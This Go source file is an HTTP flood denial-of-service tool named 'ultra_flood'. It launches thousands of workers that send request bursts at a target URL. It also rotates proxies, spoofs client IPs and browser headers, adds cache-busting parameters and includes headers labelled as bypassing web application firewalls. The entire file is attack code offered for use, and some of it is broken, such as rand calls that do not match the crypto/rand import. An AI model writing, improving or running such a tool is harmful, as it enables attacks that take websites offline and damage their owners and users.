package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"math"
	"net"
	"net/http"
	"net/http/httptrace"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/quic-go/quic-go/http3"
	"golang.org/x/net/http2"
)

// ==================== HYPER-CONFIGURATION ====================
const (
	MAX_CONNECTIONS    = 500000      // Half million connections
	MAX_RPS_PER_CONN   = 2000        // 1k requests/sec per connection
	MAX_WORKERS        = 10000       // 10k worker goroutines
	CONNECTION_TIMEOUT = 30 * time.Second
	REQUEST_TIMEOUT    = 10 * time.Second
	KEEP_ALIVE        = 300 * time.Second
	BUFFER_SIZE       = 65536        // 64KB buffer
)

// ==================== ADVANCED CIPHER SUITES ====================
var cipherSuites = []uint16{
	// TLS 1.3 ciphers
	tls.TLS_AES_128_GCM_SHA256,
	tls.TLS_AES_256_GCM_SHA384,
	tls.TLS_CHACHA20_POLY1305_SHA256,
	tls.TLS_AES_128_CCM_SHA256,
	tls.TLS_AES_128_CCM_8_SHA256,
	
	// TLS 1.2 ECDHE ciphers
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
	
	// Advanced ciphers
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384,
	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,
}

// ==================== HEADER DATABASES ====================
var (
	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"application/json, text/javascript, */*; q=0.01",
		"application/json, text/plain, */*",
		"*/*",
	}

	cacheHeaders = []string{
		"max-age=0",
		"no-cache",
		"no-store",
		"pre-check=0",
		"post-check=0",
		"must-revalidate",
		"proxy-revalidate",
		"s-maxage=604800",
		"no-cache, no-store,private, max-age=0, must-revalidate",
		"no-cache, no-store,private, s-maxage=604800, must-revalidate",
		"no-cache, no-store,private, max-age=604800, must-revalidate",
	}

	languageHeaders = []string{
		"fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
		"en-US,en;q=0.5",
		"en-US,en;q=0.9",
		"de-CH;q=0.7",
		"da, en-gb;q=0.8, en;q=0.7",
		"cs;q=0.5",
		"id-ID,id;q=0.9",
		"zh-CN,zh;q=0.9",
		"ja-JP,ja;q=0.9",
		"ko-KR,ko;q=0.9",
		"ru-RU,ru;q=0.9",
		"es-ES,es;q=0.9",
	}

	encodingHeaders = []string{
		"gzip, deflate, br, zstd",
		"compress, gzip, br",
		"deflate, gzip, br",
		"gzip, identity",
		"br, gzip, deflate",
	}

	fetchSites = []string{"same-origin", "same-site", "cross-site", "none"}
	fetchModes = []string{"navigate", "same-origin", "no-cors", "cors"}
	fetchDests = []string{"document", "sharedworker", "subresource", "unknown", "worker"}

	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
	}

	// Windows architectures and versions for realistic spoofing
	windowsVersions = []string{
		"Windows NT 10.0; Win64; x64",
		"Windows NT 11.0; Win64; x64",
		"Windows NT 6.3; Win64; x64",
		"Windows NT 6.2; Win64; x64",
		"Windows NT 6.1; Win64; x64",
		"Windows NT 6.0; Win64; x64",
		"Windows NT 5.2; Win64; x64",
		"Windows NT 5.1; Win64; x64",
	}
)

// ==================== CONNECTION POOL ====================
type ConnectionPool struct {
	connections []*http.Client
	mu          sync.RWMutex
	index       uint64
	proxyList   []string
	target      *url.URL
	tlsConfig   *tls.Config
}

func NewConnectionPool(target string, proxyFile string, poolSize int) (*ConnectionPool, error) {
	parsedURL, err := url.Parse(target)
	if err != nil {
		return nil, err
	}

	cp := &ConnectionPool{
		target:    parsedURL,
		proxyList: loadProxies(proxyFile),
		tlsConfig: createTLSConfig(),
	}

	// Create connection pool
	cp.connections = make([]*http.Client, poolSize)
	for i := 0; i < poolSize; i++ {
		cp.connections[i] = cp.createHTTPClient(i)
	}

	return cp, nil
}

func (cp *ConnectionPool) createHTTPClient(index int) *http.Client {
	dialer := &net.Dialer{
		Timeout:   CONNECTION_TIMEOUT,
		KeepAlive: KEEP_ALIVE,
		DualStack: true,
	}

	// Random proxy selection
	var transport http.RoundTripper
	if len(cp.proxyList) > 0 {
		proxyIndex := index % len(cp.proxyList)
		proxyURL, _ := url.Parse("http://" + cp.proxyList[proxyIndex])
		transport = &http.Transport{
			Proxy:               http.ProxyURL(proxyURL),
			DialContext:         dialer.DialContext,
			ForceAttemptHTTP2:   true,
			MaxIdleConns:        10000,
			MaxIdleConnsPerHost: 10000,
			MaxConnsPerHost:     0, // Unlimited
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
			TLSClientConfig:     cp.tlsConfig,
			DisableCompression:  false,
		}
	} else {
		transport = &http.Transport{
			DialContext:         dialer.DialContext,
			ForceAttemptHTTP2:   true,
			MaxIdleConns:        10000,
			MaxIdleConnsPerHost: 10000,
			MaxConnsPerHost:     0,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
			TLSClientConfig:     cp.tlsConfig,
			DisableCompression:  false,
		}
	}

	// Enable HTTP/3 for better performance
	http3Transport := &http3.RoundTripper{
		TLSClientConfig: cp.tlsConfig,
	}

	// Multi-protocol transport
	multiTransport := &MultiProtocolTransport{
		HTTP2:  transport,
		HTTP3:  http3Transport,
		Target: cp.target.Hostname(),
	}

	return &http.Client{
		Transport:     multiTransport,
		Timeout:       REQUEST_TIMEOUT,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}
}

func (cp *ConnectionPool) GetClient() *http.Client {
	index := atomic.AddUint64(&cp.index, 1) % uint64(len(cp.connections))
	return cp.connections[index]
}

// ==================== MULTI-PROTOCOL TRANSPORT ====================
type MultiProtocolTransport struct {
	HTTP2  http.RoundTripper
	HTTP3  http.RoundTripper
	Target string
}

func (m *MultiProtocolTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	// Random protocol selection for diversity
	if rand.Intn(100) < 30 { // 30% HTTP/3
		return m.HTTP3.RoundTrip(req)
	}
	return m.HTTP2.RoundTrip(req)
}

// ==================== TLS FINGERPRINT ENGINE ====================
func createTLSConfig() *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites:       cipherSuites,
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
			tls.CurveP521,
		},
		NextProtos: []string{"h3", "h2", "http/1.1"},
		Renegotiation: tls.RenegotiateFreelyAsClient,
		SessionTicketsDisabled: false,
		ClientSessionCache:     tls.NewLRUClientSessionCache(10000),
	}
}

// ==================== HEADER ROTATION ENGINE ====================
type HeaderGenerator struct {
	cookieJar      sync.Map
	sessionCounter uint64
}

func NewHeaderGenerator() *HeaderGenerator {
	return &HeaderGenerator{}
}

func (hg *HeaderGenerator) Generate(target *url.URL, proxyIP string) http.Header {
	headers := http.Header{}

	// Randomize all headers
	headers.Set("User-Agent", randomElement(userAgents))
	headers.Set("Accept", randomElement(acceptHeaders))
	headers.Set("Accept-Language", randomElement(languageHeaders))
	headers.Set("Accept-Encoding", randomElement(encodingHeaders))
	headers.Set("Accept-Charset", "utf-8, iso-8859-1;q=0.5")
	headers.Set("Connection", "keep-alive")
	headers.Set("Upgrade-Insecure-Requests", "1")
	headers.Set("Cache-Control", randomElement(cacheHeaders))
	headers.Set("Pragma", "no-cache")

	// Security headers
	if rand.Intn(100) < 70 {
		headers.Set("DNT", "1")
	}
	headers.Set("Sec-Fetch-Dest", randomElement(fetchDests))
	headers.Set("Sec-Fetch-Mode", randomElement(fetchModes))
	headers.Set("Sec-Fetch-Site", randomElement(fetchSites))
	headers.Set("Sec-Fetch-User", "?1")

	// Modern browser headers
	headers.Set("Sec-CH-UA", `"Not A(Brand";v="99", "Google Chrome";v="120", "Chromium";v="120"`)
	headers.Set("Sec-CH-UA-Mobile", "?0")
	headers.Set("Sec-CH-UA-Platform", `"Windows"`)
	headers.Set("Sec-CH-UA-Full-Version", "120.0.0.0")
	headers.Set("Sec-CH-UA-Arch", "x86")
	headers.Set("Sec-CH-UA-Bitness", "64")
	headers.Set("Sec-CH-UA-Model", `""`)

	// IP rotation headers
	if proxyIP != "" {
		headers.Set("X-Forwarded-For", proxyIP)
		headers.Set("X-Real-IP", proxyIP)
		headers.Set("X-Client-IP", proxyIP)
		headers.Set("Forwarded", fmt.Sprintf("for=%s;proto=https;by=%s", proxyIP, proxyIP))
	}

	// Custom headers to bypass WAF
	headers.Set("X-Requested-With", "XMLHttpRequest")
	headers.Set("X-Ajax-Request", "true")
	headers.Set("X-Request-ID", generateRequestID())
	headers.Set("X-Correlation-ID", generateRequestID())
	headers.Set("X-Trace-ID", generateRequestID())

	// Cache busting
	headers.Set("X-Cache-Buster", generateCacheBuster())

	// Add cookies if needed
	cookie := hg.generateCookie(target.Host)
	if cookie != "" {
		headers.Set("Cookie", cookie)
	}

	return headers
}

func (hg *HeaderGenerator) generateCookie(domain string) string {
	if rand.Intn(100) < 60 { // 60% chance to send cookies
		cookieName := randomCookieName()
		cookieValue := generateRandomString(32)
		
		hg.cookieJar.Store(domain+"_"+cookieName, cookieValue)
		
		return fmt.Sprintf("%s=%s; path=/; domain=%s; HttpOnly; Secure", 
			cookieName, cookieValue, domain)
	}
	return ""
}

func generateRequestID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func generateCacheBuster() string {
	return fmt.Sprintf("%d_%s", time.Now().UnixNano(), generateRandomString(8))
}

// ==================== REQUEST ENGINE ====================
type RequestEngine struct {
	pool           *ConnectionPool
	headerGen      *HeaderGenerator
	stats          *AttackStats
	rateLimiter    *RateLimiter
	circuitBreaker *CircuitBreaker
}

func NewRequestEngine(pool *ConnectionPool, stats *AttackStats) *RequestEngine {
	return &RequestEngine{
		pool:           pool,
		headerGen:      NewHeaderGenerator(),
		stats:          stats,
		rateLimiter:    NewRateLimiter(MAX_RPS_PER_CONN * len(pool.connections)),
		circuitBreaker: NewCircuitBreaker(5, 30*time.Second),
	}
}

func (re *RequestEngine) SendRequest() {
	if !re.circuitBreaker.Allow() {
		return
	}

	client := re.pool.GetClient()
	
	// Generate unique request parameters
	targetURL := *re.pool.target
	query := targetURL.Query()
	
	// Add cache-busting parameters
	query.Set("_t", strconv.FormatInt(time.Now().UnixNano(), 10))
	query.Set("_r", generateRandomString(16))
	query.Set("_v", generateRandomString(8))
	query.Set("cb", generateCacheBuster())
	
	// Add realistic parameters
	query.Set("page", strconv.Itoa(rand.Intn(100)+1))
	query.Set("sort", randomElement([]string{"asc", "desc"}))
	query.Set("filter", randomElement([]string{"all", "new", "popular"}))
	
	targetURL.RawQuery = query.Encode()

	// Generate headers with random proxy IP
	var proxyIP string
	if len(re.pool.proxyList) > 0 {
		proxyIP = strings.Split(re.pool.proxyList[rand.Intn(len(re.pool.proxyList))], ":")[0]
	} else {
		proxyIP = generateRandomIP()
	}
	
	headers := re.headerGen.Generate(&targetURL, proxyIP)

	// Create request with trace
	req, err := http.NewRequest("GET", targetURL.String(), nil)
	if err != nil {
		re.stats.IncrementError()
		re.circuitBreaker.Failure()
		return
	}
	req.Header = headers

	// Add random delay for human-like behavior
	if re.rateLimiter.Allow() {
		time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
	}

	// Send request
	start := time.Now()
	resp, err := client.Do(req)
	duration := time.Since(start)

	if err != nil {
		re.stats.IncrementError()
		re.circuitBreaker.Failure()
		return
	}
	defer resp.Body.Close()

	// Update stats
	re.stats.IncrementRequest()
	
	// Read response minimally
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		re.stats.IncrementSuccess()
		re.circuitBreaker.Success()
	} else if resp.StatusCode == 429 || resp.StatusCode == 403 || resp.StatusCode == 503 {
		re.stats.IncrementBlocked()
		re.circuitBreaker.Failure()
	} else {
		re.stats.IncrementFailure()
	}
	
	re.stats.AddLatency(duration)
}

// ==================== RATE LIMITER ====================
type RateLimiter struct {
	rate     int
	interval time.Duration
	tokens   int64
	lastTime time.Time
	mu       sync.Mutex
}

func NewRateLimiter(rate int) *RateLimiter {
	return &RateLimiter{
		rate:     rate,
		interval: time.Second / time.Duration(rate),
		tokens:   int64(rate),
		lastTime: time.Now(),
	}
}

func (rl *RateLimiter) Allow() bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	now := time.Now()
	elapsed := now.Sub(rl.lastTime)
	
	// Add tokens based on elapsed time
	rl.tokens += int64(elapsed / rl.interval)
	if rl.tokens > int64(rl.rate) {
		rl.tokens = int64(rl.rate)
	}
	
	rl.lastTime = now
	
	if rl.tokens > 0 {
		rl.tokens--
		return true
	}
	return false
}

// ==================== CIRCUIT BREAKER ====================
type CircuitBreaker struct {
	failures     int64
	maxFailures  int64
	resetTimeout time.Duration
	lastFailure  time.Time
	state        int32 // 0: closed, 1: open, 2: half-open
	mu           sync.RWMutex
}

func NewCircuitBreaker(maxFailures int64, resetTimeout time.Duration) *CircuitBreaker {
	return &CircuitBreaker{
		maxFailures:  maxFailures,
		resetTimeout: resetTimeout,
		state:        0,
	}
}

func (cb *CircuitBreaker) Allow() bool {
	cb.mu.RLock()
	defer cb.mu.RUnlock()

	if atomic.LoadInt32(&cb.state) == 1 { // Open
		if time.Since(cb.lastFailure) > cb.resetTimeout {
			atomic.CompareAndSwapInt32(&cb.state, 1, 2) // Half-open
			return true
		}
		return false
	}
	return true
}

func (cb *CircuitBreaker) Success() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	
	atomic.StoreInt32(&cb.state, 0) // Closed
	atomic.StoreInt64(&cb.failures, 0)
}

func (cb *CircuitBreaker) Failure() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	
	atomic.AddInt64(&cb.failures, 1)
	cb.lastFailure = time.Now()
	
	if atomic.LoadInt64(&cb.failures) >= cb.maxFailures {
		atomic.StoreInt32(&cb.state, 1) // Open
	}
}

// ==================== ATTACK STATISTICS ====================
type AttackStats struct {
	totalRequests int64
	successful    int64
	failed        int64
	blocked       int64
	errors        int64
	totalLatency  int64 // nanoseconds
	startTime     time.Time
	mu            sync.RWMutex
}

func NewAttackStats() *AttackStats {
	return &AttackStats{
		startTime: time.Now(),
	}
}

func (s *AttackStats) IncrementRequest() {
	atomic.AddInt64(&s.totalRequests, 1)
}

func (s *AttackStats) IncrementSuccess() {
	atomic.AddInt64(&s.successful, 1)
}

func (s *AttackStats) IncrementFailure() {
	atomic.AddInt64(&s.failed, 1)
}

func (s *AttackStats) IncrementBlocked() {
	atomic.AddInt64(&s.blocked, 1)
}

func (s *AttackStats) IncrementError() {
	atomic.AddInt64(&s.errors, 1)
}

func (s *AttackStats) AddLatency(duration time.Duration) {
	atomic.AddInt64(&s.totalLatency, int64(duration))
}

func (s *AttackStats) GetRPS() float64 {
	elapsed := time.Since(s.startTime).Seconds()
	if elapsed == 0 {
		return 0
	}
	return float64(atomic.LoadInt64(&s.totalRequests)) / elapsed
}

func (s *AttackStats) GetAvgLatency() float64 {
	total := atomic.LoadInt64(&s.totalRequests)
	if total == 0 {
		return 0
	}
	return float64(atomic.LoadInt64(&s.totalLatency)) / float64(total) / 1e6 // Convert to ms
}

func (s *AttackStats) GetSuccessRate() float64 {
	total := atomic.LoadInt64(&s.totalRequests)
	if total == 0 {
		return 0
	}
	return float64(atomic.LoadInt64(&s.successful)) / float64(total) * 100
}

func (s *AttackStats) String() string {
	return fmt.Sprintf(
		"🚀 RPS: %.0f | 📊 Total: %s | ✅ Success: %s | 🚫 Blocked: %s | ❌ Failed: %s | ⚡ Latency: %.2fms | 📈 Success Rate: %.2f%%",
		s.GetRPS(),
		formatNumber(atomic.LoadInt64(&s.totalRequests)),
		formatNumber(atomic.LoadInt64(&s.successful)),
		formatNumber(atomic.LoadInt64(&s.blocked)),
		formatNumber(atomic.LoadInt64(&s.failed)),
		s.GetAvgLatency(),
		s.GetSuccessRate(),
	)
}

// ==================== WORKER POOL ====================
type WorkerPool struct {
	workers      []*Worker
	requestEngines []*RequestEngine
	stats        *AttackStats
	stopChan     chan struct{}
	wg           sync.WaitGroup
}

type Worker struct {
	id            int
	requestEngine *RequestEngine
	stopChan      chan struct{}
	wg            *sync.WaitGroup
}

func NewWorkerPool(poolSize int, target string, proxyFile string, stats *AttackStats) (*WorkerPool, error) {
	connPool, err := NewConnectionPool(target, proxyFile, poolSize*10) // 10 connections per worker
	if err != nil {
		return nil, err
	}

	wp := &WorkerPool{
		workers:      make([]*Worker, poolSize),
		requestEngines: make([]*RequestEngine, poolSize),
		stats:        stats,
		stopChan:     make(chan struct{}),
	}

	for i := 0; i < poolSize; i++ {
		re := NewRequestEngine(connPool, stats)
		wp.requestEngines[i] = re
		wp.workers[i] = &Worker{
			id:            i,
			requestEngine: re,
			stopChan:      make(chan struct{}),
			wg:            &wp.wg,
		}
	}

	return wp, nil
}

func (wp *WorkerPool) Start() {
	for _, worker := range wp.workers {
		wp.wg.Add(1)
		go worker.run()
	}
}

func (wp *WorkerPool) Stop() {
	close(wp.stopChan)
	wp.wg.Wait()
}

func (w *Worker) run() {
	defer w.wg.Done()

	burstSize := 100 // Send requests in bursts
	burstInterval := 10 * time.Millisecond
	
	ticker := time.NewTicker(burstInterval)
	defer ticker.Stop()

	for {
		select {
		case <-w.stopChan:
			return
		case <-ticker.C:
			for i := 0; i < burstSize; i++ {
				go w.requestEngine.SendRequest()
			}
		}
	}
}

// ==================== UTILITY FUNCTIONS ====================
func loadProxies(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return []string{}
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	return proxies
}

func randomElement(slice []string) string {
	return slice[rand.Intn(len(slice))]
}

func generateRandomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	rand.Read(b)
	for i := range b {
		b[i] = chars[int(b[i])%len(chars)]
	}
	return string(b)
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(255), rand.Intn(255),
		rand.Intn(255), rand.Intn(255))
}

func randomCookieName() string {
	names := []string{
		"sessionid", "csrftoken", "auth_token", "user_id",
		"remember_me", "cart_id", "visitor_id", "tracking_id",
		"_ga", "_gid", "_gat", "AMP_TOKEN", "_gac",
	}
	return randomElement(names)
}

func formatNumber(n int64) string {
	in := strconv.FormatInt(n, 10)
	out := make([]byte, len(in)+(len(in)-1)/3)
	
	for i, j, k := len(in)-1, len(out)-1, 0; ; i, j = i-1, j-1 {
		out[j] = in[i]
		if i == 0 {
			return string(out)
		}
		if k++; k == 3 {
			j, k = j-1, 0
			out[j] = ','
		}
	}
}

// ==================== MAIN FUNCTION ====================
func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 4 {
		fmt.Println("Usage: ./ultra_flood <target_url> <duration_seconds> <proxy_file>")
		fmt.Println("Example: ./ultra_flood https://example.com 600 proxies.txt")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Invalid duration: %v\n", err)
		os.Exit(1)
	}
	proxyFile := os.Args[3]

	// Validate URL
	_, err = url.Parse(target)
	if err != nil {
		fmt.Printf("Invalid URL: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("🔥 ULTRA HTTP FLOOD ATTACK INITIALIZED 🔥")
	fmt.Printf("🎯 Target: %s\n", target)
	fmt.Printf("⏱️  Duration: %d seconds\n", duration)
	fmt.Printf("👷 Worker Count: %d\n", MAX_WORKERS)
	fmt.Printf("🔗 Connections: %d\n", MAX_CONNECTIONS)
	fmt.Println(strings.Repeat("=", 50))

	stats := NewAttackStats()
	workerPool, err := NewWorkerPool(MAX_WORKERS, target, proxyFile, stats)
	if err != nil {
		fmt.Printf("Failed to create worker pool: %v\n", err)
		os.Exit(1)
	}

	// Start workers
	workerPool.Start()
	
	// Monitor progress
	monitorTicker := time.NewTicker(1 * time.Second)
	stopTimer := time.NewTimer(time.Duration(duration) * time.Second)
	
	fmt.Println("\n📊 ATTACK MONITOR:")
	fmt.Println(strings.Repeat("-", 80))

	for {
		select {
		case <-monitorTicker.C:
			fmt.Printf("\r%s", stats.String())
			
			// Auto-scale based on success rate
			currentRPS := stats.GetRPS()
			if currentRPS < 1000 { // If RPS drops below 1k
				// Could implement dynamic worker scaling here
			}
			
		case <-stopTimer.C:
			fmt.Println("\n\n🛑 ATTACK COMPLETED")
			workerPool.Stop()
			monitorTicker.Stop()
			
			// Final report
			fmt.Println(strings.Repeat("=", 80))
			fmt.Printf("🎯 Target: %s\n", target)
			fmt.Printf("⏱️  Total Duration: %.2f seconds\n", time.Since(stats.startTime).Seconds())
			fmt.Printf("📊 Total Requests: %s\n", formatNumber(atomic.LoadInt64(&stats.totalRequests)))
			fmt.Printf("🚀 Average RPS: %.0f\n", stats.GetRPS())
			fmt.Printf("✅ Success Rate: %.2f%%\n", stats.GetSuccessRate())
			fmt.Printf("⚡ Average Latency: %.2fms\n", stats.GetAvgLatency())
			fmt.Printf("🚫 Blocked Requests: %s\n", formatNumber(atomic.LoadInt64(&stats.blocked)))
			fmt.Println(strings.Repeat("=", 80))
			
			return
		}
	}
}